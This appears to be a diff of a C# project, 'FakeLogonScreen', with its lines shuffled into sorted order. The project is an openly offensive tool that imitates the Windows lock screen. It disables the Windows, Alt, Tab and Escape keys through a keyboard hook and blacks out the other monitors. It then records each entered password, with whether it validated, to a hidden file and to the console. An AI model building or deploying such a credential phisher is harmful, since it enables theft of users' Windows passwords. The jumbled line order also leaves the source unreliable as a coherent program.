@@ -1,0 +1,1059 @@
+    
+        
+                
+                                  in webScreenFiles
+                                  select name).SingleOrDefault()
+                        success = true
+                    // Just save the password and close the screen
+                    continue
+                    file.WriteLine(line)
+                    foundImage = (from name
+                    foundImage = Directory.GetFiles(customLockScreenPath)[0]
+                    if (string.IsNullOrEmpty(Username))
+                    resourceMan = temp
+                    return (IntPtr)1
+                    return null
+                // A = 65 < N = 78 < Z = 90
+                // Custom image is used
+                // Default image is used
+                // Disabling Windows keys 
+                // Exit fake logon screen
+                // Hide file
+                // Obtain lock screen index
+                // Prevent black screen from being closed
+                // Set focus on password box
+                // Show all windows again
+                // Show black screen
+                // Show error
+                // Store username and password in %localappdata%
+                ActiveControl = mtbPassword
+                Application.Exit()
+                Console.WriteLine(e)
+                Console.WriteLine(line)
+                Form black = new Form()
+                RegistryKey regLockScreen = Registry.LocalMachine.OpenSubKey(regPath)
+                SID = user.Sid.Value
+                UserPrincipal user = UserPrincipal.Current
+                ValidateCredentials()
+                black.FormClosing 
+                black.Show()
+                components.Dispose()
+                e.Cancel = true
+                else
+                if (objKeyInfo.key == Keys.RWin 
+                if (ord > 78)
+                if (regLockScreen == null)
+                if (s.Primary)
+                if (string.IsNullOrEmpty(password))
+                int ord = (int)imageOrder[0]
+                lblUsername.Text = DisplayName
+                lblUsername.Text = Username
+                mtbPassword.Text = string.Empty
+                resourceCulture = value
+                return ((System.Drawing.Bitmap)(obj))
+                return defaultInstance
+                return resourceCulture
+                return resourceMan
+                s.BackgroundImage = Image.FromFile(imagePath)
+                s.Context = ContextType.Machine
+                s.Context = user.ContextType
+                s.DisplayName = user.DisplayName
+                s.Username = Environment.UserName
+                s.Username = user.SamAccountName
+                string imageOrder = (string)regLockScreen.GetValue(null)
+                success = true
+                using (PrincipalContext context = new PrincipalContext(Context))
+                {
+                }
+              </xsd:sequence>
+              <xsd:sequence>
+            ((System.ComponentModel.ISupportInitialize)(this.pbSubmit)).BeginInit()
+            ((System.ComponentModel.ISupportInitialize)(this.pbSubmit)).EndInit()
+            ((System.ComponentModel.ISupportInitialize)(this.pbUser)).BeginInit()
+            ((System.ComponentModel.ISupportInitialize)(this.pbUser)).EndInit()
+            // 
+            // Ask again if password is incorrect
+            // Block window from being closed using Alt 
+            // Could happen in case for example the (local) user's password is empty
+            // Create new black fullscreen window on every additional screen
+            // Initialize new screen
+            // LogonScreen
+            // Make this the active window
+            // Minimize all other windows
+            // Output result of logon screen
+            // Print to console
+            // Set background
+            // Set focus on password box
+            // Set username
+            // Show
+            // Source: https://stackoverflow.com/a/3227562
+            // Source: https://stackoverflow.com/a/785110
+            // Validate password
+            // lblError
+            // lblUsername
+            // llblResetPassword
+            // llblSigninOptions
+            // mtbPassword
+            // pPassword
+            // pbSubmit
+            // pbUser
+            // tlpControls
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+            : using a System.ComponentModel.TypeConverter
+            </xsd:complexType>
+            <xsd:complexType>
+            ActiveControl = mtbPassword
+            Application.EnableVisualStyles()
+            Application.Run(s)
+            Application.SetCompatibleTextRenderingDefault(false)
+            Console.WriteLine(((MaskedTextBox)sender).Text)
+            InitializeComponent()
+            LogonScreen s = new LogonScreen()
+            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule
+            Show()
+            ValidateCredentials()
+            WindowState = FormWindowState.Maximized
+            WindowState = FormWindowState.Minimized
+            base.Dispose(disposing)
+            catch (Exception e)
+            catch (Exception)
+            catch(Exception e)
+            else
+            else if (!string.IsNullOrEmpty(Username))
+            foreach (Screen s in Screen.AllScreens)
+            get {
+            if (!string.IsNullOrEmpty(DisplayName))
+            if (!success)
+            if (File.Exists(imagePath))
+            if (disposing 
+            if (e.KeyCode == Keys.Enter)
+            if (nCode >= 0)
+            objKeyboardProcess = new LowLevelKeyboardProc(captureKey)
+            public IntPtr extra
+            public Keys key
+            public int flags
+            public int scanCode
+            public int time
+            return (flags 
+            return foundImage
+            set {
+            string SID = string.Empty
+            string foundImage = null
+            string imagePath = GetImagePath(SID) 
+            string password = mtbPassword.Text
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
+            this.ControlBox = false
+            this.Controls.Add(this.tlpControls)
+            this.DoubleBuffered = true
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+            this.FormClosing 
+            this.Load 
+            this.MaximizeBox = false
+            this.MinimizeBox = false
+            this.PerformLayout()
+            this.ResumeLayout(false)
+            this.ShowIcon = false
+            this.ShowInTaskbar = false
+            this.SuspendLayout()
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized
+            this.lblError = new System.Windows.Forms.Label()
+            this.lblError.Dock = System.Windows.Forms.DockStyle.Bottom
+            this.lblError.ForeColor = System.Drawing.Color.White
+            this.lblError.TabIndex = 5
+            this.lblError.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
+            this.lblUsername = new System.Windows.Forms.Label()
+            this.lblUsername.BackColor = System.Drawing.Color.Transparent
+            this.lblUsername.Dock = System.Windows.Forms.DockStyle.Fill
+            this.lblUsername.ForeColor = System.Drawing.Color.White
+            this.lblUsername.TabIndex = 1
+            this.lblUsername.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
+            this.llblResetPassword = new System.Windows.Forms.LinkLabel()
+            this.llblResetPassword.ActiveLinkColor = System.Drawing.Color.DarkGray
+            this.llblResetPassword.Dock = System.Windows.Forms.DockStyle.Bottom
+            this.llblResetPassword.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline
+            this.llblResetPassword.LinkColor = System.Drawing.Color.White
+            this.llblResetPassword.TabIndex = 2
+            this.llblResetPassword.TabStop = true
+            this.llblResetPassword.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
+            this.llblSigninOptions = new System.Windows.Forms.LinkLabel()
+            this.llblSigninOptions.ActiveLinkColor = System.Drawing.Color.DarkGray
+            this.llblSigninOptions.Dock = System.Windows.Forms.DockStyle.Bottom
+            this.llblSigninOptions.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline
+            this.llblSigninOptions.LinkColor = System.Drawing.Color.White
+            this.llblSigninOptions.TabIndex = 3
+            this.llblSigninOptions.TabStop = true
+            this.llblSigninOptions.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
+            this.mtbPassword = new System.Windows.Forms.MaskedTextBox()
+            this.mtbPassword.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.mtbPassword.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+            this.mtbPassword.KeyUp 
+            this.mtbPassword.TabIndex = 1
+            this.mtbPassword.UseSystemPasswordChar = true
+            this.pPassword = new System.Windows.Forms.Panel()
+            this.pPassword.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.pPassword.Controls.Add(this.mtbPassword)
+            this.pPassword.Controls.Add(this.pbSubmit)
+            this.pPassword.PerformLayout()
+            this.pPassword.ResumeLayout(false)
+            this.pPassword.SuspendLayout()
+            this.pPassword.TabIndex = 3
+            this.pbSubmit = new System.Windows.Forms.PictureBox()
+            this.pbSubmit.Click 
+            this.pbSubmit.Image = global::FakeLogonScreen.Properties.Resources.SubmitIcon
+            this.pbSubmit.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+            this.pbSubmit.TabIndex = 2
+            this.pbSubmit.TabStop = false
+            this.pbUser = new System.Windows.Forms.PictureBox()
+            this.pbUser.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.pbUser.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None
+            this.pbUser.Image = global::FakeLogonScreen.Properties.Resources.UserIcon
+            this.pbUser.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
+            this.pbUser.TabIndex = 4
+            this.pbUser.TabStop = false
+            this.tlpControls = new System.Windows.Forms.TableLayoutPanel()
+            this.tlpControls.Anchor = System.Windows.Forms.AnchorStyles.None
+            this.tlpControls.AutoSize = true
+            this.tlpControls.BackColor = System.Drawing.Color.Transparent
+            this.tlpControls.ColumnCount = 1
+            this.tlpControls.PerformLayout()
+            this.tlpControls.ResumeLayout(false)
+            this.tlpControls.RowCount = 7
+            this.tlpControls.RowStyles.Add(new System.Windows.Forms.RowStyle())
+            this.tlpControls.SuspendLayout()
+            this.tlpControls.TabIndex = 2
+            try
+            {
+            }
+          </xsd:element>
+        /
+        // Structure contain information about low-level keyboard input event 
+        ///   Looks up a localized resource of type System.Drawing.Bitmap.
+        ///   Overrides the current thread's CurrentUICulture property for all
+        ///   Returns the cached ResourceManager instance used by this class.
+        ///   resource lookups using this strongly typed resource class.
+        /// </summary>
+        /// <summary>
+        /// Clean up any resources being used.
+        /// Required designer variable.
+        /// Required method for Designer support - do not modify
+        /// The main entry point for the application.
+        /// the contents of this method with the code editor.
+        //Declaring Global objects     
+        //System level functions to be used for hook and unhook keyboard input  
+        </xsd:choice>
+        <comment>This is a comment</comment>
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        [STAThread]
+        [StructLayout(LayoutKind.Sequential)]
+        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
+        bool HasAltModifier(int flags)
+        const int MIN_ALL = 419
+        const int MIN_ALL_UNDO = 416
+        const int WM_COMMAND = 0x111
+        internal Resources() {
+        internal static System.Drawing.Bitmap SubmitIcon {
+        internal static System.Drawing.Bitmap UserIcon {
+        internal static global::System.Globalization.CultureInfo Culture {
+        internal static global::System.Resources.ResourceManager ResourceManager {
+        private IntPtr ptrHook
+        private LowLevelKeyboardProc objKeyboardProcess
+        private System.ComponentModel.IContainer components = null
+        private System.Windows.Forms.Label lblError
+        private System.Windows.Forms.Label lblUsername
+        private System.Windows.Forms.LinkLabel llblResetPassword
+        private System.Windows.Forms.LinkLabel llblSigninOptions
+        private System.Windows.Forms.MaskedTextBox mtbPassword
+        private System.Windows.Forms.Panel pPassword
+        private System.Windows.Forms.PictureBox pbSubmit
+        private System.Windows.Forms.PictureBox pbUser
+        private System.Windows.Forms.TableLayoutPanel tlpControls
+        private bool success = false
+        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())))
+        private static extern IntPtr GetModuleHandle(string name)
+        private static extern bool UnhookWindowsHookEx(IntPtr hook)
+        private static extern short GetAsyncKeyState(Keys key)
+        private static global::System.Globalization.CultureInfo resourceCulture
+        private static global::System.Resources.ResourceManager resourceMan
+        private struct KBDLLHOOKSTRUCT
+        private void InitializeComponent()
+        private void ValidateCredentials()
+        protected override void Dispose(bool disposing)
+        public ContextType Context { get
+        public LogonScreen()
+        public static Settings Default {
+        public string DisplayName { get
+        public string Username { get
+        static string GetImagePath(string SID)
+        static void Main()
+        {
+        }
+      </xsd:complexType>
+      <AutoGen>True</AutoGen>
+      <DependentUpon>LogonScreen.cs</DependentUpon>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTime>True</DesignTime>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+      <SubType>Form</SubType>
+      <xsd:complexType>
+    -->
+    ... ado.net/XML headers 
+    // This class was auto-generated by the StronglyTypedResourceBuilder
+    // class via a tool like ResGen or Visual Studio.
+    /// </summary>
+    /// <summary>
+    </Compile>
+    </EmbeddedResource>
+    </None>
+    </data>
+    </xsd:element>
+    <AssemblyName>FakeLogonScreen</AssemblyName>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>WinExe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <Prefer32Bit>false</Prefer32Bit>
+    <ProjectGuid>{D35A55BD-3189-498B-B72F-DC798172E505}</ProjectGuid>
+    <RootNamespace>FakeLogonScreen</RootNamespace>
+    <TargetFrameworkProfile />
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <value>..
+    <value>2.0</value>
+    <value>text/microsoft-resx</value>
+    Classes that don't support this are serialized and stored with the 
+    Example:
+    Microsoft ResX Schema 
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    ResXResourceReader how to depersist the object. This is currently not 
+    The primary goals of this format is to allow a simple XML format 
+    Version 2.0
+    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
+    associated with the data types.
+    extensible. For a given mimetype the value must be set accordingly:
+    internal class Resources {
+    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase {
+    mimetype set.
+    mimetype: application/x-microsoft.net.object.binary.base64
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    mimetype: application/x-microsoft.net.object.soap.base64
+    name/value pairs.
+    partial class LogonScreen
+    public partial class LogonScreen : Form
+    read any of the formats listed below.
+    static class Program
+    text/value conversion through the TypeConverter architecture. 
+    that is mostly human readable. The generation and parsing of the 
+    type or mimetype. Type corresponds to a .NET class that support 
+    using System
+    value   : The object must be serialized into a byte array 
+    value   : The object must be serialized with 
+    various data types are done through the TypeConverter classes 
+    {
+    }
+   and/or other materials provided with the distribution.
+   contributors may be used to endorse or promote products derived from
+   list of conditions and the following disclaimer.
+   this list of conditions and the following disclaimer in the documentation
+   this software without specific prior written permission.
+  <!-- 
+  </ItemGroup>
+  </Profiles>
+  </PropertyGroup>
+  </data>
+  </resheader>
+  </startup>
+  </xsd:schema>
+  <ItemGroup>
+  <Profiles>
+  <PropertyGroup>
+  <Settings />
+  <startup>
+ !tools/packages.config
+ (90 - ord) 
+ (ModifierKeys 
+ (components != null))
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ .NET Core
+ // if 0 is returned then All the above keys will be enabled
+ 0x20) == 0x20
+ 10 
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ Cake - Uncomment if you are using it
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ FAKE - F
+ FakeLogonScreen
+ Features
+ FileAttributes.System)
+ Files built by Visual Studio
+ Files/
+ Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ HasAltModifier(objKeyInfo.flags) 
+ Including strong name files can present a security risk
+ Installshield output folder
+ Ionide (cross platform F
+ Keys.Control) == Keys.Control)
+ Local History for Visual Studio
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ Node.js Tools for Visual Studio
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OR BUSINESS INTERRUPTION) HOWEVER
+ OpenCover UI analysis results
+ Others
+ Paket dependency manager
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ SQL Server files
+ Screenshot
+ StyleCop
+ TFS 2012 Local Workspace
+ Tabs Studio
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ VS Code tools) working folder
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 workspace options file
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 16
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ Windows Store app package directories and files
+ because we have git 
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ cache files
+ command.
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ in these scripts will be unencrypted
+ objKeyInfo.key == Keys.Escape 
+ objKeyInfo.key == Keys.LWin 
+ objKeyInfo.key == Keys.Tab 
+ report files from converting an old project file
+ schema ...
+ set
+ tools/
+!.axoCover/settings.json
+"                                  where name.StartsWith(string.Format(@""{0}"
+"                    // If for whatever reason the username couldn't be resolved, the password can most likely also not be validated"
+"                    BackColor = System.Drawing.Color.Black,"
+"                    ControlBox = false,"
+"                    FormBorderStyle = FormBorderStyle.None,"
+"                    List<string> webScreenFiles = new List<string>(Directory.GetFiles(webScreenPath, ""img"
+"                    Location = new Point(s.WorkingArea.Left, s.WorkingArea.Top)"
+"                    MaximizeBox = false,"
+"                    MinimizeBox = false,"
+"                    ShowIcon = false,"
+"                    ShowInTaskbar = false,"
+"                    StartPosition = FormStartPosition.Manual,"
+"                    WindowState = FormWindowState.Maximized,"
+"                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager(""FakeLogonScreen.Properties.Resources"", typeof(Resources).Assembly)"
+"                    password = ""[blank password]"""
+"                    string customImagePath = string.Format(@""{0}"
+"                    string customLockScreenPath = string.Format(@""{0}"
+"                    string image = string.Format(""img{0}"", ord "
+"                    string webScreenPath = @""C:"
+"                    success = context.ValidateCredentials(Username, password)"
+"                // Even if a wrong password is typed, it might be valuable"
+"                // Open registry, if path exists"
+"                <xsd:element name=""comment"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""2"" />"
+"                <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" />"
+"                <xsd:element name=""value"" type=""xsd:string"" minOccurs=""0"" msdata:Ordinal=""1"" />"
+"                Console.WriteLine(""Output written to {0}"", path)"
+"                File.SetAttributes(path, FileAttributes.Hidden "
+"                IntPtr lHwnd = FindWindow(""Shell_TrayWnd"", null)"
+"                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT))"
+"                SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero)"
+"                if (object.ReferenceEquals(resourceMan, null)) {"
+"                lblError.Text = ""The password is incorrect. Try again."""
+"                lblUsername.Text = ""User"""
+"                object obj = ResourceManager.GetObject(""SubmitIcon"", resourceCulture)"
+"                object obj = ResourceManager.GetObject(""UserIcon"", resourceCulture)"
+"                s.BackColor = Color.FromArgb(0, 90, 158)"
+"                string line = string.Format(""{0}: {1} --> {2}"", this.Username, password, success "
+"                string path = string.Format(@""{0}"
+"                string regPath = string.Format(@""SOFTWARE"
+"                using (StreamWriter file = new StreamWriter(path, true))"
+"              <xsd:attribute name=""alias"" type=""xsd:string"" />"
+"              <xsd:attribute name=""mimetype"" type=""xsd:string"" />"
+"              <xsd:attribute name=""mimetype"" type=""xsd:string"" msdata:Ordinal=""4"" />"
+"              <xsd:attribute name=""name"" type=""xsd:string"" />"
+"              <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" />"
+"              <xsd:attribute name=""name"" type=""xsd:string"" use=""required"" msdata:Ordinal=""1"" />"
+"              <xsd:attribute name=""name"" use=""required"" type=""xsd:string"" />"
+"              <xsd:attribute name=""type"" type=""xsd:string"" />"
+"              <xsd:attribute name=""type"" type=""xsd:string"" msdata:Ordinal=""3"" />"
+"              <xsd:attribute ref=""xml:space"" />"
+"            // Disable WinKey, Alt"
+"            // If correct password, save and close screen"
+"            IntPtr lHwnd = FindWindow(""Shell_TrayWnd"", null)"
+"            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero)"
+"            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0)"
+"            return CallNextHookEx(ptrHook, nCode, wp, lp)"
+"            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F)"
+"            this.ClientSize = new System.Drawing.Size(800, 811)"
+"            this.Name = ""LogonScreen"""
+"            this.Text = ""Windows Logon Application"""
+"            this.lblError.Font = new System.Drawing.Font(""Segoe UI Light"", 12F)"
+"            this.lblError.Location = new System.Drawing.Point(3, 368)"
+"            this.lblError.Name = ""lblError"""
+"            this.lblError.Size = new System.Drawing.Size(694, 20)"
+"            this.lblUsername.Font = new System.Drawing.Font(""Segoe UI Semilight"", 39.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)))"
+"            this.lblUsername.Location = new System.Drawing.Point(3, 206)"
+"            this.lblUsername.Name = ""lblUsername"""
+"            this.lblUsername.Size = new System.Drawing.Size(694, 106)"
+"            this.lblUsername.Text = ""User"""
+"            this.llblResetPassword.Font = new System.Drawing.Font(""Segoe UI Light"", 12F)"
+"            this.llblResetPassword.Location = new System.Drawing.Point(3, 403)"
+"            this.llblResetPassword.Margin = new System.Windows.Forms.Padding(3, 15, 3, 0)"
+"            this.llblResetPassword.Name = ""llblResetPassword"""
+"            this.llblResetPassword.Size = new System.Drawing.Size(694, 23)"
+"            this.llblResetPassword.Text = ""Reset password"""
+"            this.llblSigninOptions.Font = new System.Drawing.Font(""Segoe UI Light"", 12F)"
+"            this.llblSigninOptions.Location = new System.Drawing.Point(3, 441)"
+"            this.llblSigninOptions.Margin = new System.Windows.Forms.Padding(3, 15, 3, 0)"
+"            this.llblSigninOptions.Name = ""llblSigninOptions"""
+"            this.llblSigninOptions.Size = new System.Drawing.Size(694, 50)"
+"            this.llblSigninOptions.Text = ""Sign-in options"""
+"            this.mtbPassword.Font = new System.Drawing.Font(""Microsoft Sans Serif"", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)))"
+"            this.mtbPassword.Location = new System.Drawing.Point(51, 12)"
+"            this.mtbPassword.Name = ""mtbPassword"""
+"            this.mtbPassword.Size = new System.Drawing.Size(200, 26)"
+"            this.pPassword.Location = new System.Drawing.Point(192, 315)"
+"            this.pPassword.Name = ""pPassword"""
+"            this.pPassword.Size = new System.Drawing.Size(315, 50)"
+"            this.pbSubmit.Location = new System.Drawing.Point(251, 12)"
+"            this.pbSubmit.Name = ""pbSubmit"""
+"            this.pbSubmit.Size = new System.Drawing.Size(26, 26)"
+"            this.pbUser.Location = new System.Drawing.Point(250, 3)"
+"            this.pbUser.Name = ""pbUser"""
+"            this.pbUser.Size = new System.Drawing.Size(200, 200)"
+"            this.tlpControls.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100F))"
+"            this.tlpControls.Controls.Add(this.lblError, 0, 3)"
+"            this.tlpControls.Controls.Add(this.lblUsername, 0, 1)"
+"            this.tlpControls.Controls.Add(this.llblResetPassword, 0, 4)"
+"            this.tlpControls.Controls.Add(this.llblSigninOptions, 0, 5)"
+"            this.tlpControls.Controls.Add(this.pPassword, 0, 2)"
+"            this.tlpControls.Controls.Add(this.pbUser, 0, 0)"
+"            this.tlpControls.Location = new System.Drawing.Point(42, 257)"
+"            this.tlpControls.Name = ""tlpControls"""
+"            this.tlpControls.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 20F))"
+"            this.tlpControls.Size = new System.Drawing.Size(700, 511)"
+"          <xsd:element name=""assembly"">"
+"          <xsd:element name=""data"">"
+"          <xsd:element name=""metadata"">"
+"          <xsd:element name=""resheader"">"
+"        /// <param name=""disposing"">true if managed resources should be disposed"
+"        <xsd:choice maxOccurs=""unbounded"">"
+"        [DllImport(""kernel32.dll"", CharSet = CharSet.Auto, SetLastError = true)]"
+"        [DllImport(""user32.dll"", CharSet = CharSet.Auto)]"
+"        [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true)]"
+"        [DllImport(""user32.dll"", EntryPoint = ""FindWindow"", SetLastError = true)]"
+"        [DllImport(""user32.dll"", EntryPoint = ""SendMessage"", SetLastError = true)]"
+"        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute(""Microsoft.Performance"", ""CA1811:AvoidUncalledPrivateCode"")]"
+"        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)"
+"        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)"
+"        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp)"
+"        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId)"
+"        private void Screen_FormClosing(object sender, FormClosingEventArgs e)"
+"        private void Screen_Load(object sender, EventArgs e)"
+"        private void mtbPassword_KeyUp(object sender, KeyEventArgs e)"
+"        private void pbSubmit_Click(object sender, EventArgs e)"
+"        static extern IntPtr FindWindow(string lpClassName, string lpWindowName)"
+"        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam)"
+"    // To add or remove a member, edit your .ResX file then rerun ResGen"
+"    // with the /str option, or rebuild your VS project."
+"    ///   A strongly-typed resource class, for looking up localized strings, etc."
+"    <Compile Include=""LogonScreen.Designer.cs"">"
+"    <Compile Include=""LogonScreen.cs"">"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <EmbeddedResource Include=""LogonScreen.resx"">"
+"    <EmbeddedResource Include=""Properties"
+"    <None Include=""App.config"" />"
+"    <None Include=""Properties"
+"    <None Include=""Resources"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Profile Name=""(Default)"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Deployment"" />"
+"    <Reference Include=""System.DirectoryServices"" />"
+"    <Reference Include=""System.DirectoryServices.AccountManagement"" />"
+"    <Reference Include=""System.Drawing"" />"
+"    <Reference Include=""System.Windows.Forms"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    <data name=""Bitmap1"" mimetype=""application/x-microsoft.net.object.binary.base64"">"
+"    <data name=""Color1"" type=""System.Drawing.Color, System.Drawing"">Blue</data>"
+"    <data name=""Icon1"" type=""System.Drawing.Icon, System.Drawing"" mimetype=""application/x-microsoft.net.object.bytearray.base64"">"
+"    <data name=""Name1""><value>this is my long string</value><comment>this is a comment</comment></data>"
+"    <resheader name=""reader"">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>"
+"    <resheader name=""resmimetype"">text/microsoft-resx</resheader>"
+"    <resheader name=""version"">2.0</resheader>"
+"    <resheader name=""writer"">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>"
+"    <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.5""/>"
+"    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>"
+"    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>"
+"    <xsd:element name=""root"" msdata:IsDataSet=""true"">"
+"    <xsd:import namespace=""http://www.w3.org/XML/1998/namespace"" />"
+"    Each data row contains a name, and value. The row also contains a "
+"    The mimetype is used for serialized objects, and tells the "
+"    There are any number of ""resheader"" rows that contain simple "
+"    [global::System.CodeDom.Compiler.GeneratedCodeAttribute(""Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator"", ""16.4.0.0"")]"
+"    [global::System.CodeDom.Compiler.GeneratedCodeAttribute(""System.Resources.Tools.StronglyTypedResourceBuilder"", ""16.0.0.0"")]"
+"    that the ResXResourceWriter will generate, however the reader can "
+"  2020"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <assembly alias=""System.Windows.Forms"" name=""System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"" />"
+"  <data name=""SubmitIcon"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <data name=""UserIcon"" type=""System.Resources.ResXFileRef, System.Windows.Forms"">"
+"  <resheader name=""reader"">"
+"  <resheader name=""resmimetype"">"
+"  <resheader name=""version"">"
+"  <resheader name=""writer"">"
